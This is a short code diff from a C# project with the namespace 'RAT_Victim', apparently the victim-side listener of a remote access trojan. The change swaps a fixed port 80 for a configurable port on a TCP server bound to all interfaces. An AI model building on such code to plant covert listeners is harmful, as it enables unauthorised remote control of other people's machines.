@@ -21,7 +21,7 @@ namespace RAT_Victim
         private static void StartServer()
         {
             var server = new Socket(SocketType.Stream, ProtocolType.Tcp);
-            server.Bind(new IPEndPoint(IPAddress.Any, 80));
+            server.Bind(new IPEndPoint(IPAddress.Any, Common.Port));
             server.Listen(0);
 
             while (true)
